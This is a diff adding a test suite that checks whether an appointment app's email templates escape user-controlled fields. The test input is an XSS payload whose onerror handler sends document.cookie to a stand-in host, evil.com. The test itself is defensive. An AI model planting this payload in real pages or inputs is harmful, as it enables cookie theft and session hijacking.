@@ -5,7 +5,40 @@
  */
 
 import * as fc from 'fast-check';
-import { passwordResetTemplate } from '../emailTemplates.js';
+import {
+  passwordResetTemplate,
+  bookedTemplate,
+  confirmedTemplate,
+  cancelledTemplate,
+  reminderTemplate,
+} from '../emailTemplates.js';
+
+describe('emailTemplates — XSS escaping', () => {
+  const xss = `<img src=x onerror=fetch('evil.com/'+document.cookie)>`;
+
+  const baseData = {
+    patientName: xss,
+    professionalName: xss,
+    scheduledAt: new Date('2026-06-01T12:00:00Z'),
+    durationMinutes: 60,
+    address: xss,
+    notes: xss,
+  };
+
+  test.each([
+    ['bookedTemplate', bookedTemplate],
+    ['confirmedTemplate', confirmedTemplate],
+    ['cancelledTemplate', cancelledTemplate],
+    ['reminderTemplate', reminderTemplate],
+  ])('%s escapes user-controlled fields in the HTML body', (_name, tmpl) => {
+    const { html } = tmpl(baseData);
+
+    // Raw payload must not survive into the HTML
+    expect(html).not.toContain('<img src=x onerror=');
+    // Escaped form must be present instead
+    expect(html).toContain('&lt;img src=x onerror=');
+  });
+});
 
 describe('emailTemplates — property-based tests', () => {
   // ── Property 12 ────────────────────────────────────────────────────────────
